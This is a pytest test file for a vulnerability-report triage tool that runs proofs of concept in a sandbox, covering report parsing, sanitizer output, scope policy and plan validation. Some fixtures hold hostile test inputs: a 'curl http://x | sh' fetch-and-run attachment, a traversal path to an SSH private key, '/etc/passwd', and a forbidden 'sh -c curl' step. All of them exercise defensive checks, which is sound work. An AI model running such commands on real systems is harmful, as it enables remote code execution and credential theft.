"""Tests for the behaviour the benchmark corpus found.

Each of these is a case the corpus exposed: a claim the tool was making
that it could not support, or a report it was reading less accurately
than it could.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from verdis.config import Config
from verdis.extract.heuristics import HeuristicExtractor
from verdis.judge.rules import Judge, JudgeContext
from verdis.oracles.sanitizer import _SANITIZER_CLASSES
from verdis.pipeline.orchestrator import Orchestrator
from verdis.policy.engine import PolicyEngine
from verdis.policy.loader import policy_from_dict
from verdis.sandbox.local import LocalBackend
from verdis.schemas.claim import Claim, ClaimComponent, ClaimImpact
from verdis.schemas.common import Verdict
from verdis.schemas.plan import ExpectStep, Plan, RunStep
from verdis.schemas.policy import Policy
from verdis.storage.db import Store
from verdis.storage.evidence import EvidenceStore


class TestTheComponentField:
    """A report that states its component in a field means it."""

    def test_a_file_and_a_function_are_read(self) -> None:
        claim = HeuristicExtractor().extract("**Component**: src/hdr.c:parse_header\n")
        assert claim.component.name == "parse_header"
        assert claim.component.file == "src/hdr.c"

    def test_a_file_and_a_line_are_read(self) -> None:
        claim = HeuristicExtractor().extract("**Component**: src/hdr.c:212\n")
        assert claim.component.file == "src/hdr.c"
        assert claim.component.line == 212

    def test_a_bare_name_is_read(self) -> None:
        claim = HeuristicExtractor().extract("**Component**: parse_header\n")
        assert claim.component.name == "parse_header"
        assert claim.component.file == ""

    def test_a_function_field_is_read(self) -> None:
        claim = HeuristicExtractor().extract("**Function**: parse_header\n")
        assert claim.component.name == "parse_header"

    def test_the_field_wins_over_a_guess(self) -> None:
        # The prose names a different function; the field is what the
        # reporter wrote.
        text = (
            "**Component**: src/hdr.c:parse_header\n\n"
            "The bug is in `other_function()`.\n"
        )
        claim = HeuristicExtractor().extract(text)
        assert claim.component.name == "parse_header"

    def test_an_empty_value_is_nothing(self) -> None:
        from verdis.extract.heuristics import HeuristicExtractor as _H
        from verdis.schemas.common import SourceSpan

        component, file_span, name_span = _H._component_from_field(
            "   ", SourceSpan(start=0, end=0, quote="")
        )
        assert component.name == ""
        assert component.file == ""
        assert file_span is None
        assert name_span is None

    def test_a_field_with_only_a_path_is_a_file(self) -> None:
        from verdis.extract.heuristics import HeuristicExtractor as _H
        from verdis.schemas.common import SourceSpan

        span = SourceSpan(start=0, end=0, quote="")
        component, file_span, name_span = _H._component_from_field("src/hdr.c", span)
        assert component.file == "src/hdr.c"
        assert component.name == ""
        assert file_span is not None
        assert name_span is None

    def test_a_field_with_something_unreadable_is_a_file(self) -> None:
        from verdis.extract.heuristics import HeuristicExtractor as _H
        from verdis.schemas.common import SourceSpan

        span = SourceSpan(start=0, end=0, quote="")
        component, _file_span, _name_span = _H._component_from_field(
            "src/hdr.c:12-14", span
        )
        assert component.file == "src/hdr.c:12-14"
        assert component.name == ""

    def test_an_empty_field_falls_back_to_the_guess(self) -> None:
        claim = HeuristicExtractor().extract(
            "**Component**:\n\nThe bug is in `other_function()`.\n"
        )
        assert claim.component.name == "other_function"


class TestTheSanitizerClasses:
    """The classes the sanitizer actually prints have to be known."""

    @pytest.mark.parametrize(
        "text",
        [
            "ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1",
            "ERROR: AddressSanitizer: negative-size-param: (size=-1)",
            "ERROR: AddressSanitizer: allocation-size-too-big",
            "ERROR: AddressSanitizer: requested allocation size 0x1000 exceeds maximum",
            "ERROR: AddressSanitizer: memcpy-param-overlap: memory ranges overlap",
            "ERROR: AddressSanitizer: strcpy-param-overlap: memory ranges overlap",
            "ERROR: AddressSanitizer: stack-buffer-underflow on address 0x1",
            "ERROR: AddressSanitizer: new-delete-type-mismatch on address 0x1",
            "ERROR: AddressSanitizer: alloc-dealloc-mismatch on address 0x1",
            "ERROR: AddressSanitizer: container-overflow on address 0x1",
            "ERROR: AddressSanitizer: invalid-pointer-pair on address 0x1",
            "ERROR: AddressSanitizer: odr-violation",
            "ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000",
        ],
    )
    def test_the_class_is_recognised(self, text: str) -> None:
        assert _SANITIZER_CLASSES.search(text) is not None

    def test_an_ordinary_line_is_not_a_class(self) -> None:
        assert _SANITIZER_CLASSES.search("all good") is None


class TestTheMissingSymbol:
    """A report about a symbol the target does not have."""

    def _orchestrator(self, tmp_path: Path) -> Orchestrator:
        return Orchestrator(
            config=Config(sandbox="local", repeats=1),
            store=Store(tmp_path / "store"),
            evidence=EvidenceStore(tmp_path / "evidence"),
            backend=LocalBackend(),
        )

    def _project(self, tmp_path: Path, function: str = "parse_header") -> Path:
        project = tmp_path / "project"
        (project / "src").mkdir(parents=True)
        (project / "src" / "target.c").write_text(
            f"int {function}(void) {{ return 0; }}\n", encoding="utf-8"
        )
        return project

    def test_a_function_that_is_present_is_not_missing(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(name="parse_header", file="src/target.c"))
        assert Orchestrator._missing_symbol(claim, project) == ""

    def test_a_function_that_is_present_by_name_is_not_missing(
        self, tmp_path: Path
    ) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(name="parse_header"))
        assert Orchestrator._missing_symbol(claim, project) == ""

    def test_a_function_that_is_absent_is_missing(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(name="process_template"))
        assert Orchestrator._missing_symbol(claim, project) == "process_template"

    def test_a_file_that_is_absent_is_missing(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(file="src/process_template.c"))
        assert (
            Orchestrator._missing_symbol(claim, project) == "src/process_template.c"
        )

    def test_a_file_with_a_different_prefix_is_present(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(file="libfoo/src/target.c"))
        assert Orchestrator._missing_symbol(claim, project) == ""

    def test_a_target_with_no_files_is_not_checked(self, tmp_path: Path) -> None:
        empty = tmp_path / "empty"
        empty.mkdir()
        claim = Claim(component=ClaimComponent(name="parse_header"))
        assert Orchestrator._missing_symbol(claim, empty) == ""

    def test_a_target_with_no_source_is_not_checked(self, tmp_path: Path) -> None:
        project = tmp_path / "project"
        project.mkdir()
        (project / "README.md").write_text("nothing here\n", encoding="utf-8")
        claim = Claim(component=ClaimComponent(name="parse_header"))
        assert Orchestrator._missing_symbol(claim, project) == ""

    def test_a_name_that_is_not_an_identifier_is_not_checked(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(name="some thing"))
        assert Orchestrator._missing_symbol(claim, project) == ""

    def test_a_file_with_no_base_name_is_not_checked(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        claim = Claim(component=ClaimComponent(file="."))
        assert Orchestrator._missing_symbol(claim, project) == ""

    def test_a_claim_with_no_component_is_not_checked(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        assert Orchestrator._missing_symbol(Claim(), project) == ""

    def test_a_claim_that_is_not_a_claim_is_not_checked(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        assert Orchestrator._missing_symbol(None, project) == ""


class TestTheJudgeRefusesAMissingSymbol:
    def test_a_missing_symbol_is_inconclusive(self) -> None:
        verdict = Judge().judge(
            JudgeContext(claim=Claim(), missing_symbol="process_template")
        )
        assert verdict.verdict is Verdict.INCONCLUSIVE
        assert "process_template" in verdict.why

    def test_a_claim_with_the_symbol_present_is_not_stopped(self) -> None:
        verdict = Judge().judge(JudgeContext(claim=Claim()))
        assert verdict.verdict is Verdict.INCONCLUSIVE  # nothing ran
        assert "process_template" not in verdict.why


class TestUnsupportedVersionsAreOutOfScope:
    """The PRD gives an unsupported version as an out-of-scope claim."""

    def test_an_unsupported_version_is_out_of_scope(self) -> None:
        policy = policy_from_dict({"supported_versions": ["3.x"]})
        assessment = PolicyEngine(policy).check(Claim(affected_version="2.3.1"))
        assert assessment.first_out_of_scope() is not None
        assert assessment.first_exclusion() is None

    def test_a_supported_version_is_not_out_of_scope(self) -> None:
        policy = policy_from_dict({"supported_versions": ["2.x"]})
        assessment = PolicyEngine(policy).check(Claim(affected_version="2.3.1"))
        assert assessment.first_out_of_scope() is None

    def test_an_excluded_class_wins_over_the_version(self) -> None:
        policy = policy_from_dict(
            {
                "supported_versions": ["3.x"],
                "excluded_classes": [
                    {"id": "x", "description": "local denial of service"}
                ],
            }
        )
        assessment = PolicyEngine(policy).check(
            Claim(
                affected_version="2.3.1",
                impact=ClaimImpact(summary="local denial of service"),
                component=ClaimComponent(name="local_parser"),
            )
        )
        assert assessment.first_out_of_scope() is not None
        assert assessment.first_out_of_scope().verdict.value == "out_of_scope"

    def test_no_policy_means_no_out_of_scope(self) -> None:
        assessment = PolicyEngine(Policy()).check(Claim(affected_version="2.3.1"))
        assert assessment.first_out_of_scope() is None


class TestTheRecipeRunEnvironment:
    """The recipe's run environment is the maintainer's own configuration."""

    def test_the_recipe_environment_reaches_the_request(self, tmp_path: Path) -> None:
        from verdis.build.recipe import recipe_from_dict
        from verdis.sandbox.base import default_profile

        recipe = recipe_from_dict(
            {
                "language": "c",
                "run": {"env": {"ASAN_OPTIONS": "detect_leaks=0"}},
            }
        )
        orchestrator = Orchestrator(
            config=Config(sandbox="local"), backend=LocalBackend()
        )
        built = orchestrator._build_request(
            tmp_path,
            tmp_path,
            RunStep(cmd="./demo"),
            default_profile(),
            recipe=recipe,
        )
        assert built.env["ASAN_OPTIONS"] == "detect_leaks=0"

    def test_without_a_recipe_there_is_no_environment(self, tmp_path: Path) -> None:
        from verdis.sandbox.base import default_profile

        orchestrator = Orchestrator(
            config=Config(sandbox="local"), backend=LocalBackend()
        )
        built = orchestrator._build_request(
            tmp_path, tmp_path, RunStep(cmd="./demo"), default_profile()
        )
        assert built.env == {}


class TestTheArtifactRewrite:
    """Only a name that was staged is rewritten."""

    def test_a_staged_name_is_pointed_at_the_staging_area(self, tmp_path: Path) -> None:
        from verdis.schemas.plan import CopyStep

        plan = Plan(
            steps=(
                RunStep(cmd="./demo poc.bin"),
                CopyStep(artifact="poc.bin", to="/work/poc.bin"),
                ExpectStep(oracle="crash"),
            )
        )
        argv = Orchestrator._rewrite_artifacts(
            ["./demo", "poc.bin"],
            plan,
            staging=tmp_path,
            container=True,
            staged={"poc.bin"},
        )
        assert argv == ["./demo", "/work/poc.bin"]

    def test_a_name_that_was_not_staged_is_left_alone(self, tmp_path: Path) -> None:
        from verdis.schemas.plan import CopyStep

        plan = Plan(
            steps=(
                RunStep(cmd="./demo poc.bin"),
                CopyStep(artifact="poc.bin", to="/work/poc.bin"),
                ExpectStep(oracle="crash"),
            )
        )
        argv = Orchestrator._rewrite_artifacts(
            ["./demo", "poc.bin"],
            plan,
            staging=tmp_path,
            container=True,
            staged=set(),
        )
        # The file belongs to the project, so the run finds it in the
        # source directory.
        assert argv == ["./demo", "poc.bin"]

    def test_a_staged_name_without_a_copy_step_is_still_reachable(
        self, tmp_path: Path
    ) -> None:
        argv = Orchestrator._rewrite_artifacts(
            ["./demo", "poc.bin"],
            None,
            staging=tmp_path,
            container=False,
            staged={"poc.bin"},
        )
        assert argv == ["./demo", str(tmp_path / "poc.bin")]

    def test_a_staged_name_in_a_container_points_at_the_workdir(
        self, tmp_path: Path
    ) -> None:
        argv = Orchestrator._rewrite_artifacts(
            ["./demo", "poc.bin"],
            None,
            staging=tmp_path,
            container=True,
            staged={"poc.bin"},
        )
        assert argv == ["./demo", "/work/poc.bin"]


class TestTheWorkdirEscape:
    """A path that begins with the workdir can still leave it."""

    def test_a_traversal_out_of_the_workdir_is_flagged(self) -> None:
        from verdis.planner.validator import PlanValidator

        plan = Plan(
            steps=(
                RunStep(cmd="./build/target /work/../.ssh/id_rsa"),
                ExpectStep(oracle="crash"),
            )
        )
        validation = PlanValidator().validate(plan)
        assert validation.needs_confirmation

    def test_a_path_inside_the_workdir_is_allowed(self) -> None:
        from verdis.planner.validator import PlanValidator

        plan = Plan(
            steps=(
                RunStep(cmd="./build/target /work/poc.bin"),
                ExpectStep(oracle="crash"),
            )
        )
        assert PlanValidator().validate(plan).ok

    def test_a_normalised_path_is_resolved(self) -> None:
        from verdis.planner.validator import _normalise_path

        assert _normalise_path("/work/../etc/passwd") == "/etc/passwd"
        assert _normalise_path("/work/./poc.bin") == "/work/poc.bin"
        assert _normalise_path("/work/a/../b") == "/work/b"
        assert _normalise_path("/") == "/"


class TestTheComponentFieldEdges:
    """The edges of reading a component out of a field."""

    def _component(self, value: str):
        from verdis.extract.heuristics import HeuristicExtractor
        from verdis.schemas.common import SourceSpan

        span = SourceSpan(start=0, end=len(value), quote=value)
        return HeuristicExtractor._component_from_field(value, span)

    def test_a_quoted_value_keeps_its_span(self) -> None:
        component, file_span, name_span = self._component("`src/hdr.c:parse_header`")
        assert component.name == "parse_header"
        assert file_span is not None
        assert file_span.quote == "src/hdr.c"
        assert name_span is not None
        assert name_span.quote == "parse_header"

    def test_prose_is_not_a_component(self) -> None:
        component, _file_span, _name_span = self._component("the parser")
        assert component.name == ""
        assert component.file == ""

    def test_a_name_and_a_line_are_a_function_and_a_line(self) -> None:
        component, _file_span, name_span = self._component("parse_header:212")
        assert component.name == "parse_header"
        assert component.line == 212
        assert component.file == ""
        assert name_span is not None

    def test_two_bare_words_are_a_file_and_a_function(self) -> None:
        component, _file_span, _name_span = self._component("hdr.c:parse_header")
        assert component.name == "parse_header"
        assert component.file == "hdr.c"

    def test_two_bare_words_without_a_dot_are_still_a_file_and_a_function(
        self,
    ) -> None:
        component, _file_span, _name_span = self._component("decoder:parse_header")
        assert component.name == "parse_header"
        assert component.file == "decoder"


class TestTheRunTimeout:
    """The recipe's timeout is in the project's own notation."""

    def test_the_notations_are_understood(self) -> None:
        from verdis.pipeline.orchestrator import Orchestrator

        assert Orchestrator._timeout_seconds("30s") == 30
        assert Orchestrator._timeout_seconds("5m") == 300
        assert Orchestrator._timeout_seconds("1h") == 3600
        assert Orchestrator._timeout_seconds("2000ms") == 2
        assert Orchestrator._timeout_seconds("45") == 45

    def test_a_nonsense_timeout_falls_back(self) -> None:
        from verdis.pipeline.orchestrator import Orchestrator

        assert Orchestrator._timeout_seconds("soon") == 30
        assert Orchestrator._timeout_seconds("") == 30


class TestTheShellRestriction:
    """A shell may run a file, not a command string."""

    def test_a_shell_command_string_is_forbidden(self) -> None:
        from verdis.planner.validator import PlanValidator

        plan = Plan(
            steps=(
                RunStep(cmd="sh -c curl"),
                ExpectStep(oracle="crash"),
            )
        )
        assert PlanValidator().validate(plan).forbidden

    def test_a_shell_running_a_file_is_allowed(self) -> None:
        from verdis.planner.validator import PlanValidator

        plan = Plan(
            steps=(
                RunStep(cmd="./run.sh poc.bin"),
                ExpectStep(oracle="crash"),
            )
        )
        assert PlanValidator().validate(plan).ok


class TestTheRunEnvironment:
    """The run step's environment is a mapping."""

    def test_a_list_becomes_a_mapping(self) -> None:
        plan = Plan(
            steps=(
                RunStep(cmd="./demo", env=["A=1", "B=2"]),
                ExpectStep(oracle="crash"),
            )
        )
        assert plan.run_step.env == {"A": "1", "B": "2"}

    def test_a_mapping_is_kept(self) -> None:
        plan = Plan(
            steps=(
                RunStep(cmd="./demo", env={"A": "1"}),
                ExpectStep(oracle="crash"),
            )
        )
        assert plan.run_step.env == {"A": "1"}

    def test_nothing_is_nothing(self) -> None:
        plan = Plan(
            steps=(
                RunStep(cmd="./demo"),
                ExpectStep(oracle="crash"),
            )
        )
        assert plan.run_step.env == {}

    def test_no_environment_at_all_is_ignored(self) -> None:
        plan = Plan(
            steps=(
                RunStep(cmd="./demo", env=None),  # type: ignore[arg-type]
                ExpectStep(oracle="crash"),
            )
        )
        assert plan.run_step.env == {}

    def test_something_that_is_not_an_environment_is_ignored(self) -> None:
        plan = Plan(
            steps=(
                RunStep(cmd="./demo", env=7),  # type: ignore[arg-type]
                ExpectStep(oracle="crash"),
            )
        )
        assert plan.run_step.env == {}


class TestTheSystemPaths:
    """The system paths a proof of concept may name."""

    def test_the_null_device_is_allowed(self) -> None:
        from verdis.planner.validator import PlanValidator

        plan = Plan(
            steps=(
                RunStep(cmd="./build/target /dev/null"),
                ExpectStep(oracle="crash"),
            )
        )
        assert PlanValidator().validate(plan).ok


class TestTheSymbolSearchIsBounded:
    """The symbol check must not read a whole repository."""

    def test_a_large_repository_is_not_searched_forever(self, tmp_path: Path) -> None:
        from verdis.pipeline.orchestrator import _MAX_FILES_SEARCHED

        project = tmp_path / "project"
        (project / "src").mkdir(parents=True)
        for index in range(20):
            (project / "src" / f"file{index}.c").write_text(
                f"int function_{index}(void) {{ return 0; }}\n", encoding="utf-8"
            )
        claim = Claim(component=ClaimComponent(name="not_in_this_tree"))
        assert Orchestrator._missing_symbol(claim, project) == "not_in_this_tree"
        assert _MAX_FILES_SEARCHED > 0


class TestTheNotEstablishedText:
    def test_a_refused_claim_does_not_say_the_run_failed(self) -> None:
        verdict = Judge().judge(
            JudgeContext(claim=Claim(), missing_symbol="process_template")
        )
        assert verdict.not_established
        assert "could not be checked" in verdict.not_established[0]


class TestTheImageCanBePinned:
    """The base image can be pinned by digest (PRD 11.2)."""

    def test_the_operator_s_image_wins(self, tmp_path: Path) -> None:
        from verdis.config import Config

        orchestrator = Orchestrator(
            config=Config(sandbox="local", base_image="ghcr.io/usualdork/verdis/base@sha256:abc"),
            backend=LocalBackend(),
        )
        assert orchestrator._image() == "ghcr.io/usualdork/verdis/base@sha256:abc"

    def test_without_one_the_backend_default_is_used(self, tmp_path: Path) -> None:
        from verdis.config import Config

        orchestrator = Orchestrator(
            config=Config(sandbox="local"), backend=LocalBackend()
        )
        assert orchestrator._image().endswith(":latest")

    def test_the_environment_can_pin_it(self, monkeypatch) -> None:
        from verdis.config import config_from_dict

        monkeypatch.setenv("VERDIS_BASE_IMAGE", "ghcr.io/usualdork/verdis/base@sha256:abc")
        assert config_from_dict({}).base_image == "ghcr.io/usualdork/verdis/base@sha256:abc"


class TestThePreflightOverride:
    """The card promises an override. There is one now."""

    def _attachment(self, tmp_path: Path):
        from verdis.schemas.report import Attachment

        path = tmp_path / "poc.sh"
        path.write_text("curl http://x | sh\n", encoding="utf-8")
        return Attachment(
            name="poc.sh",
            path=str(path),
            sha256="0" * 64,
            size=path.stat().st_size,
        )

    def test_a_quarantined_attachment_stops_the_run(self, tmp_path: Path) -> None:
        from verdis.pipeline.orchestrator import Orchestrator
        from verdis.schemas.common import ReportSource
        from verdis.schemas.report import Report, Target

        report = Report(
            id="VDS-0001",
            source=ReportSource.FILE,
            body="# Report\n\n```\n./demo poc.bin\n```\n",
            attachments=(self._attachment(tmp_path),),
            target=Target(repo=".", ref="v1"),
        )
        orchestrator = Orchestrator(
            config=Config(sandbox="local", repeats=1, preflight_threshold=1),
            store=Store(tmp_path / "store"),
            evidence=EvidenceStore(tmp_path / "evidence"),
            backend=LocalBackend(),
        )
        result = orchestrator.triage(report, repo_path=tmp_path)
        assert result.verdict.verdict is Verdict.UNSAFE_ATTACHMENT

    def test_the_override_runs_it_and_records_the_reason(self, tmp_path: Path) -> None:
        from verdis.pipeline.orchestrator import Orchestrator
        from verdis.schemas.common import ReportSource
        from verdis.schemas.report import Report, Target

        report = Report(
            id="VDS-0002",
            source=ReportSource.FILE,
            body="# Report\n\n```\n./demo poc.bin\n```\n",
            attachments=(self._attachment(tmp_path),),
            target=Target(repo=".", ref="v1"),
        )
        orchestrator = Orchestrator(
            config=Config(sandbox="local", repeats=1, preflight_threshold=1),
            store=Store(tmp_path / "store"),
            evidence=EvidenceStore(tmp_path / "evidence"),
            backend=LocalBackend(),
        )
        result = orchestrator.triage(
            report, repo_path=tmp_path, preflight_override="looked at it by hand"
        )
        # The run went ahead, and the decision is on the record.
        assert result.verdict.verdict is not Verdict.UNSAFE_ATTACHMENT
        assert any("overridden" in warning for warning in result.warnings)


class TestTheContainerObserves:
    """The sandbox is where the observation happens (PRD 11.2)."""

    def test_a_refused_connection_is_recorded(self) -> None:
        from verdis.sandbox.container import _blocked_network_attempts

        output = "connect: Network is unreachable\n"
        assert _blocked_network_attempts(output) == ("network is unreachable",)

    def test_a_refused_name_is_recorded(self) -> None:
        from verdis.sandbox.container import _blocked_network_attempts

        output = "Could not resolve host: example.org\n"
        assert _blocked_network_attempts(output) == ("could not resolve host",)

    def test_an_ordinary_failure_is_not_a_network_attempt(self) -> None:
        from verdis.sandbox.container import _blocked_network_attempts

        assert _blocked_network_attempts("Segmentation fault") == ()

    def test_the_same_denial_is_recorded_once(self) -> None:
        from verdis.sandbox.container import _blocked_network_attempts

        output = "Network is unreachable\nNetwork is unreachable\n"
        assert _blocked_network_attempts(output) == ("network is unreachable",)


class TestTheHardenedProfileDegrades:
    """A profile that asks for a runtime the host lacks still runs."""

    def test_the_run_goes_ahead_without_the_runtime(self, tmp_path: Path, monkeypatch) -> None:
        from verdis.sandbox.base import (
            SandboxLimits,
            SandboxRequest,
            hardened_profile,
        )
        from verdis.sandbox.container import ContainerBackend

        class _Concrete(ContainerBackend):
            runtime = "fake"
            name = "fake"

            def _unused(self) -> None:  # pragma: no cover
                raise NotImplementedError

        backend = _Concrete(binary="fake")
        monkeypatch.setattr(backend, "available", lambda: True)
        monkeypatch.setattr(backend, "_read_oci_runtime", lambda: "crun")
        monkeypatch.setattr(
            backend, "_image_digest", lambda image: "", raising=False
        )
        request = SandboxRequest(
            image="",
            command=["true"],
            limits=SandboxLimits(timeout_s=5),
            profile=hardened_profile(),
        )
        # The run goes ahead, and the result admits what protected it.
        result = backend.run(request)
        assert "the host used crun" in result.isolation

    def test_the_runtime_is_used_when_it_is_there(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        from verdis.sandbox.base import (
            SandboxLimits,
            SandboxRequest,
            hardened_profile,
        )
        from verdis.sandbox.container import ContainerBackend

        class _Concrete(ContainerBackend):
            runtime = "fake"
            name = "fake"

            def _unused(self) -> None:  # pragma: no cover
                raise NotImplementedError

        backend = _Concrete(binary="fake")
        monkeypatch.setattr(backend, "available", lambda: True)
        monkeypatch.setattr(backend, "_read_oci_runtime", lambda: "runsc")
        monkeypatch.setattr(
            backend, "_image_digest", lambda image: "", raising=False
        )
        request = SandboxRequest(
            image="",
            command=["true"],
            limits=SandboxLimits(timeout_s=5),
            profile=hardened_profile(),
        )
        result = backend.run(request)
        assert result.isolation == "runsc"
